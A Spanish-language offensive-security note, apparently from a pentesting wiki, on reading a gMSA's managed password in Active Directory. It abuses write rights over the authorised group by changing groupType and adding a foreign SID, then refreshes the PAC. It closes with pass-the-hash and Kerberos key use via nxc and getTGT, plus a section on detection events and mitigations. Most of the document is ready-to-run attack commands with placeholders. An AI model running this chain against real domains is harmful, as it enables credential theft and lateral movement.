---
title: gMSA — leer la contraseña gestionada abusando del grupo
tags: [windows, active-directory, gmsa, ldap, kerberos, privesc]
---

# gMSA: de un `GenericAll` sobre el grupo a la clave de la cuenta

[🇬🇧 English](gmsa-read-key.en.md) | **Español**

## 1. Cómo se protege una gMSA

Una *group Managed Service Account* guarda su contraseña en `msDS-ManagedPassword`, pero solo la pueden leer los principals listados (por SID) en `msDS-GroupMSAMembership`. Normalmente ese atributo apunta a un **grupo**, no a usuarios sueltos.

Consecuencia: quien pueda escribir en la composición de ese grupo —o tenga `GenericAll` sobre la gMSA— puede añadirse y leer la clave.

## 2. Enumerar

```bash
ldeep ldap -u '<user>' -p '<password>' -d '<domain>' -s 'ldap://<DC_IP>' search '(objectClass=msDS-GroupManagedServiceAccount)' msDS-GroupMSAMembership sAMAccountName
```

O con `bloodyAD`:

```bash
bloodyAD -u '<user>' -p '<password>' -d '<domain>' --host <DC_IP> get object 'CN=<gMSA>,CN=Managed Service Accounts,DC=<domain>,DC=<tld>' --attr msDS-GroupMSAMembership,sAMAccountName
```

El valor es un `SD` binario: en la parte DACL aparecen los SIDs autorizados. Busca el grupo que los contiene y comprueba tus permisos sobre él:

```bash
bloodyAD -u '<user>' -p '<password>' -d '<domain>' --host <DC_IP> get object 'CN=<grupo>,CN=Users,DC=<domain>,DC=<tld>' --attr groupType,member
```

`GenericAll`/`WriteProperty` sobre el grupo (`msDS-GroupMSAMembership` incluido) es el camino.

## 3. Cambiar el ámbito del grupo y añadirse

Un grupo **Global** no admite miembros de otro dominio; uno **Domain Local** sí. Los valores de `groupType` lo dicen todo:

| Valor | Significado |
|---|---|
| `-2147483646` | Global, seguridad |
| `-2147483640` | Universal, seguridad |
| `-2147483644` | Domain Local, seguridad |

La secuencia que funciona cuando atacas desde otro dominio: Global → Universal → Domain Local, y alta del usuario por **SID** (el nombre puede no resolver entre dominios).

```bash
bloodyAD -u '<user>' -p '<password>' -d '<domain>' --host <DC_IP> set object 'CN=<grupo>,CN=Users,DC=<domain>,DC=<tld>' groupType -v -2147483640
bloodyAD -u '<user>' -p '<password>' -d '<domain>' --host <DC_IP> set object 'CN=<grupo>,CN=Users,DC=<domain>,DC=<tld>' groupType -v -2147483644
bloodyAD -u '<user>' -p '<password>' -d '<domain>' --host <DC_IP> add groupMember 'CN=<grupo>,CN=Users,DC=<domain>,DC=<tld>' 'S-1-5-21-<otro-dominio>-1105'
```

## 4. Refrescar el PAC antes de leer

El ticket que ya tienes no incluye el grupo nuevo. Pide uno nuevo y una prueba de servicio para forzar el PAC actualizado:

```bash
kinit '<user>@<DOMAIN>'          # o getTGT.py con -dc-ip
kvno 'ldap/<dc>.<domain>'
```

Sin este paso, `ldeep`/`gMSADumper` autentican con el PAC viejo y el DC responde como si no fueras miembro (o con `KRB_AP_ERR_MODIFIED`).

## 5. Leer la contraseña

```bash
ldeep ldap -u '<user>' -p '<password>' -d '<domain>' -s 'ldap://<DC_IP>' gmsa
gMSADumper.py -u '<user>' -p '<password>' -d '<domain>' -l '<DC_IP>'
```

Devuelve el blob `msDS-ManagedPassword`, del que salen el **hash NT** y las claves **AES128/AES256**. Uso:

```bash
nxc smb <TARGET> -u '<gMSA>$' -H '<NT_HASH>'
nxc winrm <TARGET> -u '<gMSA>$' -H '<NT_HASH>'
```

Con Kerberos puro:

```bash
getTGT.py -dc-ip <DC_IP> '<domain>/<gMSA>$' -aesKey '<AES256>'
export KRB5CCNAME='<gMSA>$.ccache'
nxc smb <TARGET> -k --use-kcache
```

## 6. Errores típicos

- **`The specified account does not exist`** al añadir por SID → el SID no resuelve en ese dominio; usa el SID completo del objeto, no el nombre.
- **`Unwilling to perform`** al cambiar `groupType` → el grupo tiene miembros incompatibles con el nuevo ámbito; quita el miembro problemático o usa otro grupo.
- **`LDAP error 53`** → el atributo es de sistema; hay que escribir con permisos delegados, no como admin de dominio necesariamente.
- **La clave no aparece** → PAC sin refrescar (paso 4) o el principal no está en `msDS-GroupMSAMembership`.
- **`KRB_AP_ERR_SKEW`** → reloj; ver [reloj y Kerberos](../general/kerberos-clock.md).

## 7. Detección y mitigación

- **4662** sobre `msDS-GroupMSAMembership` y cambios de `groupType` en **5136**.
- **4728/4732** (alta en grupo) desde cuentas que no gestionan identidades de servicio.
- Alertar de `kvno` sobre `ldap/<dc>` seguido de lectura masiva de `msDS-ManagedPassword`.
- Limitar quién puede escribir en los grupos referenciados por gMSA; no usar grupos Global si hay confianza entre dominios.
- Rotar la contraseña de la gMSA (`Reset-ADServiceAccountPassword`) tras un incidente.

MITRE: T1558, T1087.002, T1098.
